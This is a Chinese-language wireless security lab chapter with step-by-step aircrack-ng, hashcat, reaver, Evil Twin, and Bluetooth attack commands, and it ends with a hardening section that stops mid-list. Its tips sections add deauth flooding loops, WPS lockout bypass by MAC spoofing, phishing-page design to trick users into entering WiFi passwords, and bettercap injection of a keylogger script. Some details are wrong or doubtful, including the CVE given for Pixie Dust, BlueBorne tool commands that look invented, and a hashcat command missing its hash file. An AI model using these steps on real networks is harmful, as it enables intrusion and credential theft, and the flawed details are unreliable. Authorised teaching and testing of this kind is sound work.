# 15 | 无线网络安全

> **难度**：⭐⭐⭐ 中级　|　**预计时间**：60–90 分钟　|　**前置章节**：07_网络协议基础、09_密码学基础

---

## 一、学习目标

完成本章节后，你将能够：

1. **理解** 802.11 协议族的工作原理，包括各代（a/b/g/n/ac/ax）的频段、信道分配与调制方式。
2. **分析** WEP 加密的根本缺陷，并用 aircrack-ng 套件完成 WEP 破解实验。
3. **掌握** WPA/WPA2-PSK 的 4 次握手（4-Way Handshake）流程，执行抓包与字典 / hashcat 离线破解。
4. **利用** WPS PIN 的 Pixie Dust 漏洞，使用 reaver 快速获取 WPA2 密码。
5. **搭建** Evil Twin（邪恶双胞胎）钓鱼热点，理解其社会工程学与网络层面的危害。
6. **了解** 蓝牙安全威胁（BlueBorne、BLE 嗅探与欺骗）。
7. **制定** 面向家庭和中小企业的无线安全加固方案。

> ⚠️ **道德声明**：本课件中所有攻击技术仅供授权渗透测试与安全研究使用。未经许可对他人无线网络实施攻击在绝大多数国家和地区属于违法行为。请在合法授权范围内练习。

---

## 二、背景知识

### 2.1 无线网络概述

无线局域网（Wireless Local Area Network, WLAN）基于 IEEE 802.11 标准族，自 1997 年第一代标准发布以来，经历了 20 多年的演进。无线网络的核心优势在于无需物理线缆即可实现设备互联，但这同时带来了一个根本性挑战：**开放介质**（Open Medium）——电磁波在空间中传播，任何处于覆盖范围内的设备都可以"听"到通信内容，这与有线网络中线缆的物理隔离形成鲜明对比。

下面我们按时间线梳理各代标准的核心差异：

| 代际 | 标准 | 发布年份 | 频段 | 最大速率 | 典型用途 |
|------|------|---------|------|---------|---------|
| 第 1 代 | 802.11b | 1999 | 2.4 GHz | 11 Mbps | 早期家庭/办公 |
| 第 2 代 | 802.11a | 1999 | 5 GHz | 54 Mbps | 企业级 |
| 第 3 代 | 802.11g | 2003 | 2.4 GHz | 54 Mbps | 主流家庭 |
| 第 4 代 | 802.11n (Wi-Fi 4) | 2009 | 2.4/5 GHz | 600 Mbps | 宽带家庭 |
| 第 5 代 | 802.11ac (Wi-Fi 5) | 2013 | 5 GHz | 6.93 Gbps | 高性能 |
| 第 6 代 | 802.11ax (Wi-Fi 6/6E) | 2020 | 2.4/5/6 GHz | 9.6 Gbps | 高密度/低延迟 |

> Wi-Fi 6E 在原有基础上扩展了 6 GHz 频段（5925–7125 MHz），提供了 1.2 GHz 的连续频谱空间，极大地减少了信道干扰问题。

### 2.2 频段与信道

**2.4 GHz 频段**

2.4 GHz ISM（工业、科学、医学）频段是全球通用的免许可频段，范围是 2400–2483.5 MHz。在中国和大多数国家，共划分了 **14 个信道**（Channel 1–14），每个信道带宽 22 MHz：

```
信道中心频率计算公式：
f_center = 2407 + 5 × channel_number   (信道 1–13)
f_center = 2484                           (信道 14，仅日本)

信道 1: 2412 MHz   |  信道 6: 2437 MHz   |  信道 11: 2462 MHz
信道 2: 2417 MHz   |  信道 7: 2442 MHz   |  信道 12: 2467 MHz
信道 3: 2422 MHz   |  信道 8: 2447 MHz   |  信道 13: 2472 MHz
信道 4: 2427 MHz   |  信道 9: 2452 MHz   |  信道 14: 2484 MHz
信道 5: 2432 MHz   |  信道 10: 2457 MHz
```

由于每个信道占 22 MHz 带宽，相邻信道之间存在严重重叠。实际上 2.4 GHz 只有 **3 个完全不重叠的信道组**：{1, 6, 11}。如果你的邻居使用信道 6，你应该选择信道 1 或 11 来避免干扰。这是无线安全与网络稳定性的基础常识。

**5 GHz 频段**

5 GHz 频段提供更多不重叠信道（在中国 DFS 频段可用的情况下可达数十个），每个信道带宽可以是 20 MHz、40 MHz、80 MHz 或 160 MHz（80+80 MHz）。由于 5 GHz 穿墙能力较弱但干扰少、速率高，在高密度环境中优势明显。信道编号与中心频率的关系为：f_center = 5000 + 5 × channel_number（信道 36–165）。

### 2.3 帧类型与管理帧

802.11 帧分为三大类：

**1. 管理帧（Management Frame）**

管理帧负责网络的发现、认证和关联，是无线网络安全的薄弱环节：

- **Beacon 帧**：AP（接入点）定期广播，包含 SSID（网络名称）、支持的速率、安全配置等信息。Beacon 帧以约 10 次/秒的频率发送，使得客户端能够"发现"周围的无线网络。
- **Probe Request / Response**：客户端主动探测时发送 Probe Request（可广播或指定 SSID），AP 回复 Probe Response。
- **Authentication 帧**：802.11 开放系统认证（Open System Authentication）实际上不做任何身份验证——这是一个误导性名称，它的真实功能更接近"关联请求前的打招呼"。
- **Association Request / Response**：客户端与 AP 建立关联（Association），之后才能发送数据帧。

> **关键安全问题**：管理帧在绝大多数配置中是**未经加密、未经验证**的。任何人都可以伪造 Deauthentication 帧（取消关联帧）来强制断开客户端连接，这构成了 Deauth 攻击的基础。

**2. 控制帧（Control Frame）**

控制帧协助数据帧的传输，包括 RTS（请求发送）、CTS（允许发送）、ACK（确认）等。它们通常不会被攻击者直接利用，但在理解信道占用和隐蔽攻击（如 Deauth + 抓握手）时需要了解。

**3. 数据帧（Data Frame）**

数据帧携带实际的上层协议数据（IP 包等），是加密保护的主要对象。WEP、WPA、WPA2 都是对数据帧的负载进行加密。

### 2.4 无线认证与加密演进

无线安全的演进是一条从"几乎不安全"到"相对安全"的漫长道路：

**WEP（Wired Equivalent Privacy，有线等效隐私）**

- 引入年份：1997（802.11 原始标准）
- 加密算法：RC4 流密码
- 密钥长度：40-bit 或 104-bit（加上 24-bit IV，实际为 64/128-bit）
- IV（初始化向量）：24-bit，明文传输，约 16,777,216 种可能值
- **核心缺陷**：24-bit IV 空间太小，在高流量网络中数小时内 IV 就会重复；IV 以明文传输且与密文组合不当，导致通过统计攻击（FMS、KoreK、PTW）可在数分钟内恢复密钥
- **状态**：2004 年被 IEEE 正式废弃

**WPA（Wi-Fi Protected Access）**

- 引入年份：2003（作为 WEP 的临时替代）
- 企业模式（WPA-Enterprise）：802.1X + RADIUS + TKIP
- 个人模式（WPA-PSK）：预共享密钥 + TKIP
- TKIP（Temporal Key Integrity Protocol）：保持 RC4 但改进了密钥调度，每个包使用不同的临时密钥，增加了 64-bit MIC（消息完整性校验）
- **主要改进**：解决了 WEP 的 IV 重用问题，增加了 MIC 防止篡改
- **局限性**：TKIP 仍然基于 RC4，2010 年后 Wi-Fi 联盟开始逐步淘汰

**WPA2（IEEE 802.11i）**

- 引入年份：2004
- 加密算法：AES-CCMP（Advanced Encryption Standard - Counter Mode with CBC-MAC Protocol）
- AES-CCMP 提供 128-bit 加密和 48-bit IV，具有认证和完整性保护
- 个人模式（WPA2-PSK）：PBKDF2 派生 PSK → 128-bit PTK → 用于加密数据帧
- **安全性**：在预共享密钥（PSK）模式下，安全性取决于密码的强度和 4 次握手的完整性

**WPA3（IEEE 802.11i 补充）**

- 引入年份：2018
- 个人模式：SAE（Simultaneous Authentication of Equals）替代 PSK
- SAE 使用 Dragonfly 密钥交换协议，提供前向保密性（Forward Secrecy），即使密码泄露，已捕获的握手也无法离线破解
- 企业模式：192-bit 安全套件
- **开放网络模式**：OWE（Opportunistic Wireless Encryption），对开放网络提供个性化加密
- **状态**：2020 年起在新型路由器中普及

**WPS（Wi-Fi Protected Setup）**

- 引入年份：2007
- 目的：简化家庭无线网络配置，支持 PIN 码、按钮、NFC 三种方式
- PIN 码：8 位数字（实际上前 4 位校验后 4 位，有效信息量仅 10^4 + 10^4 = 约 11,000 种组合）
- **核心缺陷**：PIN 验证被分为两步（前半部分和后半部分分别验证），攻击者可分别暴力破解，总尝试次数仅需约 11,000 次；部分实现存在 Pixie Dust 离线攻击漏洞

### 2.5 4 次握手（4-Way Handshake）详解

WPA/WPA2-PSK 模式中最关键的安全机制是 4 次握手，理解它是破解和防御的前提：

```
   客户端 (STA)                          接入点 (AP)
        |                                    |
        |  1. ANonce (AP随机数)              |
        | <----------------------------------|
        |                                    |
        |  2. SNonce (STA随机数) + MIC       |
        |  (用 PTK 计算)                     |
        | ---------------------------------->|
        |                                    |
        |  3. GTK (组临时密钥) + MIC         |
        |  (用 PTK 计算)                     |
        | <----------------------------------|
        |                                    |
        |  4. 确认 ACK + MIC                 |
        | ---------------------------------->|
        |                                    |
```

**密钥派生过程**：

```
密码 (Passphrase)
    ↓ PBKDF2-SHA1 (4096 次迭代)
PSK (Pre-Shared Key, 256-bit)
    ↓ PRF-512 (使用 AP MAC + STA MAC + ANonce + SNonce)
PTK (Pairwise Temporal Key, 512-bit)
    ├── KCK (Key Confirmation Key, 128-bit)  → 用于计算 MIC
    ├── KEK (Key Encryption Key, 128-bit)      → 用于加密 GTK
    └── TK (Temporal Key, 128/256-bit)         → 用于加密数据帧
```

**破解的核心原理**：由于 ANonce 和 SNonce 以明文形式在握手帧中传输，攻击者只需要捕获完整的 4 次握手，即可离线执行字典攻击——对字典中的每个密码候选用 PBKDF2（4096 次 SHA-1）计算 PSK，再用 PRF-512 计算 PTK，最后用 KCK 验证 MIC 是否匹配。匹配则密码正确。

> **为什么 PBKDF2 4096 次迭代不够？** 现代 GPU 可以每秒计算数十万次 PBKDF2-SHA1（4096），这使得对常见密码字典（如 rockyou.txt 的 1400 万条密码）的穷举在数分钟到数小时内完成。hashcat 在高端显卡上对 WPA2 的破解速度可达每秒 10 万–50 万次。

### 2.6 无线攻击面概览

从攻击者视角来看，无线网络的攻击面可以分为以下层次：

```
┌─────────────────────────────────────────────────────┐
│  物理层 (Physical Layer)                            │
│  - 信号干扰、信号增强、物理定位                       │
├─────────────────────────────────────────────────────┤
│  链路层 / MAC 层 (Link Layer)                       │
│  - Deauth 攻击（管理帧未加密/未验证）                 │
│  - MAC 地址欺骗                                     │
│  - 信道干扰                                         │
├─────────────────────────────────────────────────────┤
│  认证层 (Authentication Layer)                       │
│  - WEP/WPA/WPA2 密码破解                            │
│  - WPS PIN 暴力破解 / Pixie Dust                    │
│  - 802.1X/EAP 攻击                                  │
├─────────────────────────────────────────────────────┤
│  网络层 (Network Layer)                             │
│  - Evil Twin / Rogue AP                             │
│  - DHCP 欺骗、ARP 欺骗                               │
│  - DNS 劫持                                        │
├─────────────────────────────────────────────────────┤
│  应用层 (Application Layer)                           │
│  - SSLStrip、中间人攻击                               │
│  - 凭证窃取（钓鱼页面）                               │
└─────────────────────────────────────────────────────┘
```

每个层次的攻击都需要不同的技术和工具，本课件将逐一展开实战实验。

---

## 三、实验环境

### 3.1 硬件要求

| 组件 | 要求 | 推荐型号 |
|------|------|---------|
| 网卡 | 支持监听模式（Monitor Mode）和数据包注入（Packet Injection） | TP-Link TL-WN722N (ath9k_htc)、Alfa AWUS036NHA (AR9271)、Alfa AWUS036ACH (RTL8812AU) |
| USB WiFi 适配器 | USB 2.0+ 接口 | 推荐 RTL8812AU（支持 5 GHz 监听） |
| 计算机 | Kali Linux / Parrot OS | 推荐 8GB+ RAM，x86_64 |
| 路由器 | 支持 WEP/WPA2/WPS | 任意家用无线路由器 |
| 手机 | 用于蓝牙实验 | 支持 BLE 的 Android 设备 |

### 3.2 软件环境

```bash
# 操作系统
Kali Linux 2024.x (推荐) 或 Parrot Security OS

# 核心工具套件
aircrack-ng          # 无线安全瑞士军刀（抓包、注入、破解）
reaver / bully        # WPS PIN 攻击
pixiewps              # Pixie Dust 离线攻击
hashcat               # GPU 加速密码破解
john the ripper       # 多用途密码破解
hostapd               # 创建伪造 AP
dnsmasq               # 轻量 DNS/DHCP 服务器
bettercap             # 综合 MITM 工具
macchanger            # MAC 地址伪装
wireless-tools        # 基础无线配置 (iwconfig, iwlist)

# 蓝牙工具
bluetoothctl          # 蓝牙管理
btmon                 # 蓝牙监控
ubertooth             # 蓝牙嗅探硬件 + 工具

# 辅助工具
airodump-ng           # 信道监听与抓包
aireplay-ng           # 数据包注入
airodump-ng / tcpdump  # 流量分析
```

### 3.3 安装与验证

```bash
# 安装 aircrack-ng 套件
sudo apt update
sudo apt install -y aircrack-ng

# 检查网卡是否支持监听模式
iwconfig

# 查看网卡芯片组
lsusb
lspci | grep -i network

# 测试监听模式（假设网卡为 wlan0）
sudo airmon-ng start wlan0

# 确认是否进入监听模式（出现 mon0 或 wlan0mon）
iwconfig

# 测试数据包注入能力
sudo aireplay-ng -9 mon0
```

> **常见问题**：如果你的网卡不支持监听/注入模式，请更换为兼容芯片组（推荐 Atheros AR9271 或 Realtek RTL8812AU）。虚拟机中的 USB 直通通常可以正常工作。

### 3.4 网络拓扑

```
                    ┌──────────────┐
                    │   互联网     │
                    └──────┬───────┘
                           │
                    ┌──────┴───────┐
                    │  目标路由器   │
                    │  (WPA2-PSK)  │
                    └──────┬───────┘
                           │ WiFi
            ┌──────────────┼──────────────┐
            │              │              │
     ┌──────┴─────┐  ┌────┴────┐  ┌──────┴─────┐
     │  合法客户端  │  │ 攻击者  │  │  合法客户端  │
     │ (Victim-1) │  │(Kali)   │  │ (Victim-2) │
     └────────────┘  └─────────┘  └────────────┘
```

---

## 四、实验步骤

### 4.1 实验一：WEP 加密破解

> WEP 虽已被废弃，但作为理解无线密码分析的经典案例，仍然是重要的教学内容。

**步骤 1：启用监听模式**

```bash
# 检查无线接口
sudo airmon-ng check kill        # 结束可能干扰的进程
sudo airmon-ng start wlan0       # 启用监听模式
# 输出：monitor mode enabled on mon0
```

**步骤 2：扫描目标网络**

```bash
# 扫描所有无线网络
sudo airodump-ng mon0

# 输出示例：
#  BSSID              PWR  Beacons  #Data  CH  ENC  ESSID
#  00:11:22:33:44:55  -45  1234     567    6  WEP  Target_WEP
```

找到目标 WEP 网络后，记录其 BSSID、信道（CH）和 ESSID。

**步骤 3：锁定信道并抓包**

```bash
# 在一个新的终端窗口中持续抓包
sudo airodump-ng --bssid 00:11:22:33:44:55 -c 6 -w wep_capture mon0

# 参数说明：
# --bssid : 指定目标 AP 的 MAC 地址
# -c      : 指定信道
# -w      : 写入文件前缀
```

**步骤 4：加速数据包收集（ARP 注入）**

WEP 破解需要足够多的数据包（通常 50,000–100,000 个 IV）。我们可以通过 ARP 注入来加速：

```bash
# 在第三个终端中执行注入攻击
sudo aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF mon0

# 参数说明：
# -3 : ARP-request 注入模式
# -b : AP 的 BSSID
# -h : 客户端 MAC（从 airodump-ng 输出中获取）
```

等待 `airodump-ng` 窗口显示的 `#Data` 列增长到 50,000 以上。

**步骤 5：破解 WEP 密钥**

```bash
# 使用 aircrack-ng 破解
sudo aircrack-ng wep_capture-01.cap

# 输出示例：
#                 KEY FOUND! [ 1A 2B 3C 4D 5E ]
#
#  Decrypted correctly: 100%
```

**原理解析**：PTW（Pyshkin, Tews, Weinmann）攻击利用 WEP IV 的弱模式。由于 RC4 是流密码，WEP 使用 IV + WEP Key 作为 RC4 的种子。当 IV 重复或接近时，通过统计攻击可以逐字节恢复密钥。PTW 攻击只需约 40,000–85,000 个独特 IV 即可恢复完整的 104-bit WEP 密钥。

---

### 4.2 实验二：WPA/WPA2-PSK 握手捕获与破解

**步骤 1：监听并锁定目标**

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng --bssid 00:11:22:33:44:55 -c 6 -w wpa_capture mon0
```

**步骤 2：执行 Deauth 攻击以捕获握手**

4 次握手只在客户端连接或重新连接时发生。如果没有活跃的握手，需要发送 Deauth 帧强制客户端重连：

```bash
# Deauth 特定客户端
sudo aireplay-ng -0 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF mon0

# 参数说明：
# -0 : Deauthentication 模式
# 5  : 发送 5 个 deauth 帧
# -a : AP BSSID
# -c : 目标客户端 MAC
```

当 `airodump-ng` 窗口右上角出现 **"WPA handshake: 00:11:22:33:44:55"** 时，表示成功捕获握手。

**步骤 3：使用 aircrack-ng 字典破解**

```bash
# 使用 rockyou 字典（需先解压）
gunzip /usr/share/wordlists/rockyou.txt.gz

# 字典破解
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa_capture-01.cap

# 输出示例：
#  KEY FOUND! [ MySecretPassword123 ]
#  Master Key     : XX XX XX XX XX ...
```

**步骤 4：使用 hashcat GPU 加速破解**

hashcat 利用 GPU 的并行计算能力，可以大幅提升破解速度：

```bash
# 将 cap 文件转换为 hashcat 格式（或直接使用 .cap/.hccapx）
# hashcat 原生支持 .cap 文件（v6.2.6+），也可转换为 .hccapx
sudo aircrack-ng wpa_capture-01.cap -J output.hccapx

# 使用 hashcat 破解（模式 2500 = WPA/WPA2）
hashcat -m 2500 output.hccapx /usr/share/wordlists/rockyou.txt

# 指定 GPU 设备
hashcat -m 2500 -d 1 output.hccapx /usr/share/wordlists/rockyou.txt

# 暴力破解（8 位数字）
hashcat -m 2500 output.hccapx -a 3 '?d?d?d?d?d?d?d?d'

# 规则增强破解
hashcat -m 2500 output.hccapx /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 性能参考（现代 GPU）：
# RTX 4090 : ~150,000–300,000 hashes/sec
# RTX 3080 : ~80,000–150,000 hashes/sec
# RTX 3060 : ~30,000–60,000 hashes/sec
```

**步骤 5：PMKID 攻击（无需客户端在线）**

部分 AP 在 Association 阶段就会发送 PMKID（Pairwise Master Key Identifier），攻击者无需等待客户端连接或发送 Deauth：

```bash
# 请求 PMKID（需要支持 802.11r 或特定固件的 AP）
sudo aireplay-ng --assoc -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF mon0

# 使用 hcxdumptool 自动捕获 PMKID
sudo hcxdumptool -i mon0 --enable_status=1 -o pmkid.pcapng

# 转换为 hashcat 格式
hcxpcaptool -o pmkid_hash.hc22000 pmkid.pcapng

# 使用 hashcat 破解（模式 22000 = WPA-PBKDF2-PMKID）
hashcat -m 22000 pmkid_hash.hc22000 /usr/share/wordlists/rockyou.txt
```

> PMKID 攻击的优势在于**完全离线**——一旦获取 PMKID，攻击者可以断开与目标网络的连接，回家慢慢破解。

---

### 4.3 实验三：WPS Pixie Dust 攻击

**步骤 1：扫描支持 WPS 的 AP**

```bash
sudo wash -i mon0

# 输出示例：
#  BSSID              Ch  dBm  WPS  Lck  Vendor    ESSID
#  00:11:22:33:44:55  6   -42  1.0  No   TP-LINK   Target_WPS
```

**步骤 2：检测 Pixie Dust 漏洞**

```bash
# 使用 reaver 检测 WPS 锁定状态和版本
sudo reaver -i mon0 -b 00:11:22:33:44:55 -vv

# 如果输出显示 "WPS PIN: '12345670'"，则存在 Pixie Dust 漏洞
```

**步骤 3：执行 Pixie Dust 攻击**

```bash
# 使用 reaver 的 Pixie Dust 模式
sudo reaver -i mon0 -b 00:11:22:33:44:55 -K 1 -vvv

# 参数说明：
# -K 1 : 启用 Pixie Dust 攻击
# -vvv : 最详细输出

# 如果成功，reaver 会自动调用 pixiewps 计算出 WPS PIN
# 输出示例：
#  [Pixie Dust] PIN: 12345670
#  [Pixie Dust] PSK: TargetWiFiPassword
```

**原理解析**：Pixie Dust（CVE-2017-13089 及相关）利用了部分路由器 WPS 实现中的弱随机数生成器（PRNG）。如果 AP 在 EAP-Nonce 或 Enroll-Nonce 中使用了可预测的随机数，攻击者可以在获取一次 EAP 交换后，在本地离线计算出 WPS PIN（通常只需几秒到几分钟）。受影响的芯片组包括 Broadcom、Ralink、Realtek 的部分固件版本。

> **防御注意**：在路由器管理界面中**禁用 WPS 功能**是防止此类攻击的最有效措施。

---

### 4.4 实验四：Evil Twin（邪恶双胞胎）攻击

Evil Twin 攻击通过创建一个与合法 AP 具有相同 SSID 的伪造热点，诱使客户端连接到攻击者控制的设备，从而实施中间人攻击。

**步骤 1：准备网络接口**

```bash
# 创建 AP 用的无线接口
sudo airmon-ng check kill
sudo ifconfig wlan0 down
sudo iw dev wlan0 set type managed
sudo ifconfig wlan0 up
```

**步骤 2：配置 hostapd（创建伪造 AP）**

```bash
# 创建 hostapd 配置文件
sudo tee /etc/hostapd/hostapd.conf > /dev/null << 'EOF'
interface=wlan0
driver=nl80211
ssid=TargetWiFi        # 伪造的目标 SSID
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
wpa=2
wpa_passphrase=EasyPassword123   # 伪造的密码（用于捕获密码）
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
ignore_broadcast_ssid=0          # 广播 SSID
EOF

# 启动 hostapd
sudo hostapd /etc/hostapd/hostapd.conf
```

**步骤 3：配置 dnsmasq（DHCP + DNS）**

```bash
# 创建 dnsmasq 配置
sudo tee /etc/dnsmasq.conf > /dev/null << 'EOF'
interface=wlan0
listen-address=192.168.4.1
bind-interfaces
dhcp-range=192.168.4.2,192.168.4.100,12h
address=/#/192.168.4.1          # 所有 DNS 查询指向自己
EOF

# 配置 AP 网络接口 IP
sudo ifconfig wlan0 192.168.4.1 netmask 255.255.255.0 up

# 启动 dnsmasq
sudo dnsmasq -C /etc/dnsmasq.conf
```

**步骤 4：配置 iptables 流量转发**

```bash
# 启用 IP 转发
sudo sysctl -w net.ipv4.ip_forward=1

# 配置 NAT
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.4.1:80
sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.4.1:443
sudo iptables -t nat -A POSTROUTING -j MASQUERADE

# 可选：使用 SSLStrip 降级 HTTPS
sudo sslstrip -l 8080 &
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
```

**步骤 5：部署钓鱼页面**

```bash
# 使用 bettercap 内置的钓鱼功能
sudo bettercap -iface wlan0 -T 192.168.4.0/24

# bettercap 内置命令
> set arp.spoof.targets AA:BB:CC:DD:EE:FF
> arp.spoof on
> net.probe on
> set http.server.path /opt/evil-portal/
> http.server on
```

**步骤 6：Deauth 放大攻击（可选）**

为了使客户端更快地连接到伪造 AP，可以同时对合法 AP 发送 Deauth：

```bash
# 在另一个接口（如 wlan1，已进入 mon 模式）上发送 Deauth
sudo aireplay-ng -0 10 -a 00:11:22:33:44:55 mon0
```

**检测手段**：客户端侧可通过查看 AP 的 MAC 地址（BSSID）是否与已知合法 AP 匹配来识别 Evil Twin。专业工具如 `Wireshark` 可以分析管理帧的异常模式。

---

### 4.5 实验五：蓝牙安全测试

**BlueBorne 漏洞概述（CVE-2017-1000251 等）**

BlueBorne 是 2017 年发现的一组蓝牙协议栈漏洞，影响 Linux (BlueZ)、Windows、iOS 和 Android 设备。攻击者可以在**不配对、不认证**的情况下，通过蓝牙远程执行代码或窃取数据。

```bash
# 检测周围蓝牙设备
sudo hcitool scan

# 扫描 BLE 设备
sudo hcitool lescan

# 使用 bettercap 蓝牙模块
sudo bettercap -eval "ble.recon on"
```

**BLE 嗅探与欺骗**

BLE（Bluetooth Low Energy）在物联网设备中广泛使用。由于 BLE 通信多数在明文或弱加密状态下传输，嗅探攻击相对容易：

```bash
# 使用 Ubertooth One 硬件进行 BLE 嗅探
sudo ubertooth-btle -f

# 使用 nRF Sniffer (需要 nRF52840 Dongle)
# 配合 Wireshark 实时解码 BLE 数据包

# BLE 欺骗攻击（伪造设备）
sudo hciconfig hci0 up
sudo hciconfig hci0 leadv 0          # 启动 BLE 广播

# 使用 btlejuice 进行 BLE MITM
sudo btlejuice -u 00:11:22:33:44:55 -v 00:AA:BB:CC:DD:EE
```

**BlueBorne 攻击实战**

```bash
# 使用 blueborne 漏洞利用框架
# 项目地址：https://github.com/ArmisSecurity/blueborne

# 检测目标设备是否易受攻击
sudo blueborne-scanner -i hci0

# 针对 Linux BlueZ 的攻击（CVE-2017-1000251）
# 可导致远程代码执行
sudo blueborne-exploit -t 00:11:22:33:44:55 -e linux
```

> **防御建议**：及时更新蓝牙设备固件、在不使用时关闭蓝牙、使用蓝牙 5.1+ 的设备（具有方向查找功能，可检测 rogue 设备）。

---

## 五、解题技巧

### 5.1 WPA/WPA2 破解优化技巧

**1. 字典选择策略**

不要盲目使用大型字典。根据目标环境选择合适的字典：

- **家庭网络**：常用密码字典（rockyou.txt、weakpass_2a）、路由器默认密码列表
- **企业网络**：企业命名规则字典（公司名+年份、电话号码等）
- **公共场所**：简单密码（12345678、password、admin）

```bash
# 字典预处理（去除无效条目）
sort -u rockyou.txt > rockyou_unique.txt

# 根据规则生成定制字典
crunch 8 8 -t @@@@@@@@ -o custom_dict.txt
# @ = 小写字母, , = 大写字母, % = 数字
```

**2. 规则增强攻击**

单纯字典攻击成功率有限，使用规则可以大幅提高成功率：

```bash
# hashcat 规则攻击
hashcat -m 2500 -a 0 hash.hccapx rockyou.txt -r rules/best64.rule
hashcat -m 2500 -a 0 hash.hccapx rockyou.txt -r rules/d3ad0ne.rule

# 组合规则（先应用规则1，再应用规则2）
hashcat -m 2500 -a 0 hash.hccapx rockyou.txt -r rules/rockyou-30000.rule -r rules/best64.rule
```

**3. 掩码攻击（Mask Attack）**

当知道密码格式时，掩码攻击比字典攻击更快：

```bash
# 8位纯数字密码
hashcat -m 2500 -a 3 hash.hccapx ?d?d?d?d?d?d?d?d

# 格式：ABC + 4位数字（如 ABC1234）
hashcat -m 2500 -a 3 hash.hccapx ABC?d?d?d?d

# 大小写字母 + 数字 + 特殊字符
hashcat -m 2500 -a 3 hash.hccapx -1 ?l?u?d?s ?1?1?1?1?1?1?1?1
```

**4. 混合攻击（Hybrid Attack）**

结合字典和掩码：

```bash
# 字典 + 数字后缀（如 password123）
hashcat -m 2500 -a 6 rockyou.txt ?d?d?d

# 数字前缀 + 字典（如 123password）
hashcat -m 2500 -a 7 ?d?d?d rockyou.txt
```

### 5.2 提高抓包成功率的技巧

**1. 选择合适的 Deauth 时机**

```bash
# 观察 airodump-ng 输出，等待客户端上线
# 当 #Data 列开始增长时，说明有活跃客户端

# 针对性 Deauth（只攻击特定客户端）
sudo aireplay-ng -0 1 -a AP_BSSID -c CLIENT_MAC mon0
# 参数 -0 1 表示只发送 1 个 deauth 帧（避免过多干扰）
```

**2. 使用频道跳频优化**

```bash
# 不锁定信道，让 airodump-ng 自动跳频扫描
# 适合未知目标环境
sudo airodump-ng mon0

# 锁定目标信道以减少干扰
sudo airodump-ng -c 6 --bssid TARGET_BSSID mon0
```

**3. 多网卡协同**

```bash
# 网卡1：监听抓包
# 网卡2：执行 Deauth / 注入攻击
# 这样可以避免单一网卡在模式切换时的性能损失
```

### 5.3 WPS 攻击技巧

**1. 批量扫描**

```bash
# 使用 wash 批量扫描支持 WPS 的 AP
# 记录 PIN 锁定状态（Lck 列）
sudo wash -i mon0 -C -s > wps_targets.txt
```

**2. 绕过 WPS 锁定**

部分路由器在多次失败尝试后会锁定 WPS 功能（通常 60 秒–60 分钟）：

```bash
# 使用 bully 的 --timeout 参数
# bully 比 reaver 更稳定，支持更多路由器
sudo bully -b AP_BSSID -v 3 -c 1 -S mon0

# 更换 MAC 地址绕过锁定（部分路由器根据 MAC 追踪失败次数）
sudo macchanger -r mon0
sudo reaver -i mon0 -b AP_BSSID -K 1 -vvv
```

### 5.4 Evil Twin 实战技巧

**1. 提高连接成功率**

- **信号强度**：使用高增益天线，确保伪造 AP 信号强于合法 AP
- **信道选择**：使用与合法 AP 相同的信道
- **Deauth 配合**：持续对合法 AP 发送 Deauth，迫使客户端重连

```bash
# 持续 Deauth 攻击
while true; do
  sudo aireplay-ng -0 5 -a AP_BSSID mon0
  sleep 10
done
```

**2. 钓鱼页面设计**

- 复制目标路由器的管理界面（如 TP-Link、Netgear 登录页）
- 提示"固件更新"、"网络优化"等诱导用户输入 WiFi 密码
- 使用 `bettercap` 的 `http.proxy` 模块拦截并修改 HTTP 响应

```bash
# bettercap HTTP 代理注入恶意 JavaScript
> set http.proxy.sslstrip true
> set http.proxy.injectjs /path/to/keylogger.js
> http.proxy on
```

---

## 六、防御措施

### 6.1 家庭无线网络加固

**1. 使用强密码**

```
✅ 推荐密码策略：
  - 长度 ≥ 16 字符
  - 包含大小写字母、数字、特殊字符
  - 避免字典单词、个人信息（生日、电话号码）
  - 示例：9K#mP@2xQ!vL8$wR

❌ 不推荐：
  - 纯数字密码（12345678）
  - 常见单词（password、admin）
  - 路由器默认密码（admin、password）
  - 个人信息相关（19850101、13800138000）
```

**2. 升级到 WPA3**

如果路由器和客户端设备都支持 WPA3，应优先使用：

- **SAE（Simultaneous Authentication of Equals）**：防止离线字典攻击
- **Forward Secrecy**：即使密码泄露，历史流量也无法解密
- **Protected Management Frames**：防止 Deauth 攻击

**3. 禁用 WPS**

进入路由器管理界面：

```
高级设置 → 无线设置 → WPS 设置 → 禁用 WPS
```

**4. 隐藏 SSID（有限防护）**

```bash
# 在路由器中设置不广播 SSID
# 注意：这只能防止被动扫描，主动 Probe Request 仍可发现 SSID
```

**5. 启用客户端隔离（Client Isolation）**

防止同一 WiFi 网络内的设备互相访问：

```
无线设置 → 高级 → 客户端隔离 → 启用
```

**6. 使用访客网络**

为访客设备创建独立的 VLAN/子网，避免访客访问家庭内部设备。

**7. 定期更新固件**

```bash
# 检查路由器厂商官网，下载最新固件
# 或使用开源固件（如 OpenWrt、DD-WRT、Asuswrt-Merlin）
```

### 6.2 企业无线网络安全

**1. 使用 WPA2/WPA3-Enterprise（802.1X）**

```
架构：
  客户端 (Supplicant)
      ↓ 802.1X / EAP
  接入点 (Authenticator)
      ↓ RADIUS
  RADIUS 服务器 (Authentication Server)
```

- 每个用户使用独立凭证（而非共享 PSK）
- 支持 EAP-TLS（证书认证）、EAP-PEAP（用户名+密码）
- 配合 RADIUS 服务器实现集中认证和审计

**2. 部署无线入侵检测系统（WIDS）**

```bash
# 使用 Kismet 监控无线环境
# Kismet 可检测：
#   - Rogue AP（未授权 AP）
#   - Evil Twin 攻击
#   - 信号干扰
#   - 客户端异常行为
sudo kismet -c wlan0mon
```

**3. 实施 MAC 地址白名单**

```
仅允许注册设备接入网络
注意：MAC 地址可伪造，此措施只能作为辅助手段
```

**4. 网络分段**

```
VLAN 10: 员工设备（域控、文件服务器访问权限）
VLAN 20: 访客设备（仅互联网访问）
